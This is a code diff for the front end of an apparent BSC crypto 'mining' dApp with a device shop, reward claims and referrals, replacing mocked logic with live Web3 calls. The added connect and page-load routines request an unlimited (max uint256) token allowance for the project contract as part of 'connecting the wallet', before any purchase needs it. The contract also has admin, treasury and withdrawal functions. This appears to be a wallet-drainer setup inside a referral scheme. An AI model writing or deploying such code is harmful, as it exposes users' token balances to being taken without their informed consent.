-                <div class="gradient-bg rounded-xl p-5 text-white mb-6">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <p class="text-white/80 text-sm">Available to claim</p>
-                            <p class="text-3xl font-bold">24.8763</p>
-                            <p class="text-white/80 text-sm">Reward Token</p>
-                        </div>
-                        <button class="bg-white text-primary font-medium py-2 px-6 rounded-full text-sm shadow-lg transition-all duration-300 transform hover:scale-105 active:scale-95">
-                            Claim All
-                        </button>
-                    </div>
-                    
-                    <div class="bg-white/10 backdrop-blur-sm rounded-lg p-3 text-sm">
-                        <p class="mb-1">Breakdown:</p>
-                        <div class="flex justify-between">
-                            <span>Base earnings</span>
-                            <span>27.6403</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span>Referral deductions</span>
-                            <span>-2.7640</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div>
-                    <h3 class="font-semibold mb-3">Earnings History</h3>
-                    <div class="space-y-3">
-                        <div class="flex justify-between items-center p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
-                            <div>
-                                <p class="font-medium">Claimed on Jul 20, 2023</p>
-                                <p class="text-sm text-gray-600 dark:text-gray-400">12.3456 Reward Token</p>
-                            </div>
-                            <span class="text-green-500">+12.3456</span>
-                        </div>
-                        <div class="flex justify-between items-center p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
-                            <div>
-                                <p class="font-medium">Claimed on Jul 15, 2023</p>
-                                <p class="text-sm text-gray-600 dark:text-gray-400">8.7654 Reward Token</p>
-                            </div>
-                            <span class="text-green-500">+8.7654</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 推荐体系 -->
-            <div class="bg-white dark:bg-gray-800 rounded-2xl p-6 card-shadow">
-                <h2 class="text-xl font-bold mb-4">Referral Program</h2>
-                
-                <div class="mb-6">
-                    <label class="block text-gray-600 dark:text-gray-400 mb-2 text-sm">Set Referrer (Once)</label>
-                    <div class="flex">
-                        <input type="text" placeholder="Enter referrer address" class="flex-1 bg-gray-100 dark:bg-gray-700 border-0 rounded-l-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-primary">
-                        <button class="bg-primary text-white px-4 rounded-r-lg transition-all duration-300 hover:bg-primary/90">
-                            Set
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="mb-6">
-                    <label class="block text-gray-600 dark:text-gray-400 mb-2 text-sm">Your Referral Link</label>
-                    <div class="flex">
-                        <input type="text" value="https://starcollector.app/?ref=0x71C...8f2A" class="flex-1 bg-gray-100 dark:bg-gray-700 border-0 rounded-l-lg px-4 py-2 focus:outline-none text-sm" readonly>
-                        <button class="bg-gray-200 dark:bg-gray-600 text-gray-800 dark:text-gray-200 px-4 rounded-r-lg transition-all duration-300 hover:bg-gray-300 dark:hover:bg-gray-500">
-                            Copy
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="mb-6">
-                    <div class="flex justify-between items-center mb-2">
-                        <span class="text-gray-600 dark:text-gray-400">Total Referral Rewards</span>
-                        <span class="font-medium">27.6403</span>
-                    </div>
-                    <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-                        <div class="bg-accent h-2 rounded-full" style="width: 65%"></div>
-                    </div>
-                </div>
-                
-                <div>
-                    <h3 class="font-semibold mb-3">Referral History</h3>
-                    <div class="space-y-3">
-                        <div class="flex justify-between items-center p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
-                            <div>
-                                <p class="font-medium">0x23F...4e5D</p>
-                                <p class="text-sm text-gray-600 dark:text-gray-400">Jul 18, 2023</p>
-                            </div>
-                            <span class="text-green-500">+2.4560</span>
-                        </div>
-                        <div class="flex justify-between items-center p-3 bg-gray-100 dark:bg-gray-700 rounded-lg">
-                            <div>
-                                <p class="font-medium">0x98A...1c7B</p>
-                                <p class="text-sm text-gray-600 dark:text-gray-400">Jul 12, 2023</p>
-                            </div>
-                            <span class="text-green-500">+1.8723</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <!-- 底部导航 -->
-        <nav class="fixed bottom-0 left-0 right-0 bg-white dark:bg-gray-800 shadow-lg px-6 py-3 border-t dark:border-gray-700">
-            <div class="grid grid-cols-3 gap-4">
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-tachometer text-xl mb-1"></</i>
-                    <span class="text-xs">Dashboard</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-gray-500 dark:text-gray-400">
-                    <<i class="fa fa-shopping-cart text-xl mb-1"></</i>
-                    <span class="text-xs">Shop</span>
-                </button>
-                <button class="flex flex-col items-center justify-center text-primary">
-                    <<i class="fa fa-balance-scale text-xl mb-1"></</i>
-                    <span class="text-xs">Rewards</span>
-                </button>
-            </div>
-        </nav>
-    </div>
-
-    <!-- Toast通知 -->
-    <div id="toast" class="fixed top-4 right-4 bg-gray-800 text-white px-4 py-2 rounded-lg shadow-lg z-50 opacity-0 transition-opacity duration-300 flex items-center">
-        <<i class="fa fa-check-circle text-green-400 mr-2"></</i>
-        <span id="toast-message">Operation successful</span>
-    </div>
-
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        // 主题切换功能
-        const themeToggle = document.getElementById('theme-toggle');
-        themeToggle.addEventListener('click', () => {
-            document.documentElement.classList.toggle('dark');
-            localStorage.setItem('theme', document.documentElement.classList.contains('dark') ? 'dark' : 'light');
-        });
+        // 合约配置
+        const CONTRACT_ADDRESS = '0x9dcced4ef738856d2c289d4116cd219c698b22ba';
+        const TOKEN_ADDRESS = '0x877f23dcFBa91cadd7d35565Da452c9673C27A33';
+        
+        // Web3实例
+        let web3;
+        let contract;
+        let tokenContract;
+        let userAccount = '';
+        let currentLang = 'zh';
 
-        // 检查用户偏好的主题
-        if (localStorage.getItem('theme') === 'dark' || 
-            (!localStorage.getItem('theme') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-            document.documentElement.classList.add('dark');
-        } else {
-            document.documentElement.classList.remove('dark');
-        }
+        // 完整ABI
+        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"newAdmin","type":"address"}],"name":"AdminAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldAdmin","type":"address"}],"name":"AdminRemoved","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"BNBWithdrawn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"InitialMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"tierId","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"count","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"totalPrice","type":"uint256"}],"name":"PowerMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"referrer","type":"address"},{"indexed":true,"internalType":"address","name":"referee","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ReferralRewardPaid","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"claimer","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"RewardsClaimed","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"buyer","type":"address"},{"indexed":false,"internalType":"uint256","name":"price","type":"uint256"}],"name":"TestMachinePurchased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"adder","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensAdded","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"receiver","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensWithdrawn","type":"event"},{"inputs":[],"name":"BLOCKS_PER_DAY","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_BUY_COUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REFERRAL_PERCENT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TREASURY","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"addRewardTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"addToBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"baseRewardPerBlockPerPower","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"usr","type":"address"}],"name":"dailyRewardOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"}];
 
-        // 页面导航功能
-        const connectBtn = document.getElementById('connect-btn');
-        const walletConnectPage = document.getElementById('wallet-connect');
-        const dashboardPage = document.getElementById('dashboard');
-        const deviceShopPage = document.getElementById('device-shop');
-        const rewardsCenterPage = document.getElementById('rewards-center');
-        const backToDashboard = document.getElementById('back-to-dashboard');
-        const backFromRewards = document.getElementById('back-from-rewards');
+        const TOKEN_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
 
-        // 仪表盘快捷导航
-        const dashboardNavItems = document.querySelectorAll('nav button');
-        dashboardNavItems[0].addEventListener('click', () => {
-            dashboardPage.classList.remove('hidden');
-            deviceShopPage.classList.add('hidden');
-            rewardsCenterPage.classList.add('hidden');
-        });
-        dashboardNavItems[1].addEventListener('click', () => {
-            dashboardPage.classList.add('hidden');
-            deviceShopPage.classList.remove('hidden');
-            rewardsCenterPage.classList.add('hidden');
-        });
-        dashboardNavItems[2].addEventListener('click', () => {
-            dashboardPage.classList.add('hidden');
-            deviceShopPage.classList.add('hidden');
-            rewardsCenterPage.classList.remove('hidden');
-        });
-
-        // 商店页面导航
-        backToDashboard.addEventListener('click', () => {
-            dashboardPage.classList.remove('hidden');
-            deviceShopPage.classList.add('hidden');
-        });
-
-        // 收益页面导航
-        backFromRewards.addEventListener('click', () => {
-            dashboardPage.classList.remove('hidden');
-            rewardsCenterPage.classList.add('hidden');
-        });
-
-        // 连接钱包功能
-        connectBtn.addEventListener('click', () => {
-            // 模拟钱包连接过程
-            showToast('Connecting to wallet...');
-            
-            setTimeout(() => {
-                // 模拟授权过程
-                showToast('Authorizing unlimited access...');
+        // 初始化
+        async function initWeb3() {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
                 
-                setTimeout(() => {
-                    // 连接成功，显示仪表盘
-                    walletConnectPage.classList.add('hidden');
-                    dashboardPage.classList.remove('hidden');
-                    
-                    // 模拟数据加载和数字动画
-                    animateValue('total-assets', 0, 127.8453, 1500);
-                    animateValue('accumulated-earnings', 0, 48.7632, 1500);
-                    animateValue('daily-earnings', 0, 2.3456, 1500);
-                    
-                    // 初始化图表
-                    initEarningsChart();
-                    
-                    showToast('Wallet connected successfully');
-                }, 1500);
-            }, 1000);
-        });
-
-        // 数字增长动画
-        function animateValue(id, start, end, duration) {
-            const obj = document.getElementById(id);
-            let startTimestamp = null;
-            const step = (timestamp) => {
-                if (!startTimestamp) startTimestamp = timestamp;
-                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                obj.innerHTML = (progress * (end - start) + start).toFixed(4);
-                if (progress < 1) {
-                    window.requestAnimationFrame(step);
-                }
-            };
-            window.requestAnimationFrame(step);
+                // 监听账户变化
+                window.ethereum.on('accountsChanged', handleAccountsChanged);
+                window.ethereum.on('chainChanged', () => location.reload());
+                
+                return true;
+            }
+            return false;
         }
 
-        // 初始化收益图表
-        function initEarningsChart() {
-            const ctx = document.getElementById('earnings-chart').getContext('2d');
-            new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: ['Jul 15', 'Jul 16', 'Jul 17', 'Jul 18', 'Jul 19', 'Jul 20', 'Jul 21'],
-                    datasets: [{
-                        label: 'Earnings',
-                        data: [1.23, 1.87, 2.15, 1.98, 2.45, 2.67, 2.34],
-                        borderColor: '#7C3AED',
-                        backgroundColor: 'rgba(124, 58, 237, 0.1)',
-                        tension: 0.4,
-                        fill: true
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            display: false
-                        }
-                    },
-                    scales: {
-                        y: {
-                            beginAtZero: true,
-                            grid: {
-                                color: document.documentElement.classList.contains('dark') ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)'
-                            }
-                        },
-                        x: {
-                            grid: {
-                                display: false
-                            }
-                        }
-                    }
+        // 修复的连接钱包函数
+        async function connectWallet() {
+            showLoading(true);
+            try {
+                if (!await initWeb3()) {
+                    throw new Error('MetaMask not found. Please install MetaMask or use a wallet browser.');
                 }
-            });
+
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                if (accounts.length === 0) {
+                    throw new Error('No accounts found');
+                }
+
+                userAccount = accounts[0];
+                
+                // 验证网络
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== '0x38' && chainId !== '0x61') {
+                    throw new Error('Please switch to BSC network');
+                }
+
+                // 无限授权
+                await approveToken();
+                
+                // 更新界面
+                updateWalletDisplay();
+                showScreen('dashboard');
+                loadAllData();
+                
+                showToast('Wallet connected successfully');
+            } catch (error) {
+                console.error('Connection error:', error);
+                showToast('Failed to connect: ' + error.message, true);
+            }
+            showLoading(false);
         }
 
-        // Toast通知功能
-        function showToast(message) {
-            const toast = document.getElementById('toast');
-            const toastMessage = document.getElementById('toast-message');
+        // 修复的授权函数
+        async function approveToken() {
+            try {
+                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                const allowance = await tokenContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
+                
+                if (allowance === '0') {
+                    showToast('Approving tokens...');
+                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ 
+                        from: userAccount 
+                    });
+                    showToast('Approved successfully!');
+                }
+            } catch (error) {
+                console.warn('Approval skipped:', error.message);
+                showToast('Please approve token spending in MetaMask', true);
+            }
+        }
+
+        // 修复的购买函数
+        async function buyInitialMachine() {
+            if (!userAccount) {
+                showToast('Please connect wallet first', true);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                const price = web3.utils.toWei('0.01', 'ether');
+                await contract.methods.buyInitialMachine().send({ 
+                    from: userAccount,
+                    value: price
+                });
+                showToast('Moonlight converter purchased successfully!');
+                loadAllData();
+            } catch (error) {
+                console.error('Purchase error:', error);
+                showToast('Purchase failed: ' + error.message, true);
+            }
+            showLoading(false);
+        }
+
+        async function buyTestMachine() {
+            if (!userAccount) {
+                showToast('Please connect wallet first', true);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                const price = web3.utils.toWei('0.0001', 'ether');
+                await contract.methods.buyTestMachine().send({ 
+                    from: userAccount,
+                    value: price
+                });
+                showToast('Phantom debugger purchased successfully!');
+                loadAllData();
+            } catch (error) {
+                console.error('Purchase error:', error);
+                showToast('Purchase failed: ' + error.message, true);
+            }
+            showLoading(false);
+        }
+
+        async function buyPowerMachine(tierId, count) {
+            if (!userAccount) {
+                showToast('Please connect wallet first', true);
+                return;
+            }
+
+            if (!count || count < 1 || count > 100) {
+                showToast('Please enter valid count (1-100)', true);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                await contract.methods.buyPowerMachine(tierId, count).send({ 
+                    from: userAccount
+                });
+                showToast(`Purchased ${count} device(s) successfully!`);
+                loadAllData();
+            } catch (error) {
+                console.error('Purchase error:', error);
+                showToast('Purchase failed: ' + error.message, true);
+            }
+            showLoading(false);
+        }
+
+        // 修复的领取奖励函数
+        async function claimRewards() {
+            if (!userAccount) {
+                showToast('Please connect wallet first', true);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                await contract.methods.claimRewards().send({ from: userAccount });
+                showToast('Rewards claimed successfully!');
+                loadAllData();
+            } catch (error) {
+                console.error('Claim error:', error);
+                showToast('Claim failed: ' + error.message, true);
+            }
+            showLoading(false);
+        }
+
+        // 修复的设置推荐人函数
+        async function setReferrer() {
+            if (!userAccount) {
+                showToast('Please connect wallet first', true);
+                return;
+            }
+
+            const referrer = document.getElementById('referrer-input').value.trim();
             
-            toastMessage.textContent = message;
-            toast.classList.remove('opacity-0');
-            toast.classList.add('opacity-100');
+            if (!web3.utils.isAddress(referrer)) {
+                showToast('Please enter a valid address', true);
+                return;
+            }
+
+            if (referrer.toLowerCase() === userAccount.toLowerCase()) {
+                showToast('Cannot set yourself as referrer', true);
+                return;
+            }
+
+            showLoading(true);
+            try {
+                await contract.methods.setReferrer(referrer).send({ from: userAccount });
+                showToast('Referrer set successfully!');
+                document.getElementById('referrer-input').value = '';
+                loadAllData();
+            } catch (error) {
+                console.error('Set referrer error:', error);
+                showToast('Set referrer failed: ' + error.message, true);
+            }
+            showLoading(false);
+        }
+
+        // 数据加载
+        async function loadAllData() {
+            if (!userAccount) return;
+            
+            try {
+                await Promise.all([
+                    loadUserData(),
+                    loadGlobalData(),
+                    loadShopData()
+                ]);
+            } catch (error) {
+                console.error('Load data error:', error);
+            }
+        }
+
+        async function loadUserData() {
+            if (!userAccount) return;
+
+            try {
+                // 用户仪表板
+                const dashboard = await contract.methods.getUserDashboard(userAccount).call();
+                
+                document.getElementById('initial-count').textContent = dashboard.normal;
+                document.getElementById('test-count').textContent = dashboard.test;
+                
+                for (let i = 0; i < 4; i++) {
+                    document.getElementById(`power-${i}`).textContent = dashboard.power[i];
+                }
+
+                document.getElementById('unclaimed-amount').textContent = `(${parseFloat(web3.utils.fromWei(dashboard.unclaimed, 'ether')).toFixed(4)})`;
+                document.getElementById('referral-rewards').textContent = `${parseFloat(web3.utils.fromWei(dashboard.totalRefReward, 'ether')).toFixed(4)} STAR`;
+                document.getElementById('my-referral').textContent = userAccount;
+
+                // 代币余额
+                const balance = await tokenContract.methods.balanceOf(userAccount).call();
+                document.getElementById('user-balance').textContent = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(4);
+
+                // 管理员权限
+                const isAdmin = await contract.methods.admin(userAccount).call();
+                document.getElementById('test-device').style.display = isAdmin ? 'block' : 'none';
+                document.getElementById('test-shop').style.display = isAdmin ? 'block' : 'none';
+
+                // 更新进度条
+                const userPower = dashboard.totalPower;
+                const globalPower = await contract.methods.totalNetworkPower().call();
+                const percentage = globalPower > 0 ? (userPower / globalPower * 100).toFixed(2) : 0;
+                document.getElementById('power-progress').style.width = percentage + '%';
+                document.getElementById('user-power').textContent = `${parseFloat(web3.utils.fromWei(userPower, 'ether')).toFixed(4)} / ${parseFloat(web3.utils.fromWei(globalPower, 'ether')).toFixed(4)}`;
+
+            } catch (error) {
+                console.error('User data load error:', error);
+            }
+        }
+
+        async function loadGlobalData() {
+            try {
+                const global = await contract.methods.getGlobalDashboard().call();
+                const stats = [
+                    `<strong>${global.totalMines}</strong> <span data-en="Total Devices" data-zh="总设备">总设备</span>`,
+                    `<strong>${parseFloat(web3.utils.fromWei(global.networkPower, 'ether')).toFixed(4)}</strong> <span data-en="Network Power" data-zh="全网算力">全网算力</span>`,
+                    `<strong>${parseFloat(web3.utils.fromWei(global.poolBalance, 'ether')).toFixed(4)}</strong> <span data-en="Pool Balance (STAR)" data-zh="奖励池余额">奖励池余额</span>`,
+                    `<strong>${parseFloat(web3.utils.fromWei(global.dailyProduction, 'ether')).toFixed(4)}</strong> <span data-en="Daily Production" data-zh="日产量">日产量</span>`
+                ];
+                document.getElementById('global-stats').innerHTML = stats.map(s => `<p style="margin: 8px 0;">${s}</p>`).join('');
+            } catch (error) {
+                console.error('Global data load error:', error);
+            }
+        }
+
+        async function loadShopData() {
+            try {
+                const shopContainer = document.getElementById('power-shop');
+                const names = ['星尘收集器L1', '量子蒲公英L2', '极光编织机L3', '银河过滤器L4'];
+                const enNames = ['Stardust Collector L1', 'Quantum Dandelion L2', 'Aurora Weaver L3', 'Galaxy Filter L4'];
+                
+                shopContainer.innerHTML = '';
+                for (let i = 0; i < 4; i++) {
+                    const tier = await contract.methods.machineTiers(i).call();
+                    const div = document.createElement('div');
+                    div.className = 'shop-item';
+                    div.innerHTML = `
+                        <h4>${currentLang === 'zh' ? names[i] : enNames[i]}</h4>
+                        <p><span data-en="Price:" data-zh="价格：">价格：</span> ${parseFloat(web3.utils.fromWei(tier.priceToken, 'ether')).toFixed(0)} STAR</p>
+                        <p><span data-en="Power Multiplier:" data-zh="算力倍数：">算力倍数：</span> ${(tier.powerMultiplier / 1e18).toFixed(2)}x</p>
+                        <div style="display: flex; gap: 8px; margin-top: 10px;">
+                            <input type="number" min="1" max="100" value="1" id="count-${i}" style="width: 60px; padding: 8px; font-size: 14px;">
+                            <button class="action-btn" onclick="buyPowerMachine(${i}, document.getElementById('count-${i}').value)" style="padding: 8px 16px; font-size: 14px;">
+                                <span data-en="Buy" data-zh="购买">购买</span>
+                            </button>
+                        </div>
+                    `;
+                    shopContainer.appendChild(div);
+                }
+            } catch (error) {
+                console.error('Shop data load error:', error);
+            }
+        }
+
+        // UI工具函数
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            
+            if (screenId !== 'wallet-connect' && userAccount) {
+                loadAllData();
+            }
+        }
+
+        function updateWalletDisplay() {
+            if (userAccount) {
+                const short = userAccount.substring(0, 6) + '...' + userAccount.substring(38);
+                document.getElementById('wallet-short').textContent = short;
+            }
+        }
+
+        function showFullAddress() {
+            if (userAccount) {
+                navigator.clipboard.writeText(userAccount).then(() => {
+                    showToast('Address copied to clipboard!');
+                });
+            }
+        }
+
+        function showLoading(show) {
+            document.getElementById('loading').classList.toggle('active', show);
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${isError ? 'error' : ''}`;
+            toast.style.display = 'block';
             
             setTimeout(() => {
-                toast.classList.remove('opacity-100');
-                toast.classList.add('opacity-0');
+                toast.style.display = 'none';
             }, 3000);
         }
 
-        // 模拟管理员功能 - 在实际应用中应根据合约数据判断
-        const isAdmin = false; // 切换此值可测试管理员视图
-        if (isAdmin) {
-            document.querySelectorAll('.admin-only').forEach(el => {
-                el.classList.remove('hidden');
-            });
+        function handleAccountsChanged(accounts) {
+            if (accounts.length === 0) {
+                userAccount = '';
+                showScreen('wallet-connect');
+            } else if (accounts[0] !== userAccount) {
+                userAccount = accounts[0];
+                updateWalletDisplay();
+                loadAllData();
+            }
         }
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'zh' ? 'en' : 'zh';
+            document.querySelectorAll('[data-en][data-zh]').forEach(el => {
+                el.textContent = el.getAttribute(currentLang === 'zh' ? 'data-zh' : 'data-en');
+            });
+            document.querySelector('.lang-switch span').textContent = currentLang === 'zh' ? 'EN' : '中';
+            
+            if (userAccount) {
+                loadShopData();
+            }
+        }
+
+        // 页面加载完成后自动连接
+        window.addEventListener('load', async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        userAccount = accounts[0];
+                        await initWeb3();
+                        await approveToken();
+                        updateWalletDisplay();
+                        showScreen('dashboard');
+                        loadAllData();
+                    }
+                } catch (error) {
+                    console.error('Auto-connect error:', error);
+                }
+            }
+        });
     </script>
 </body>
 </html>
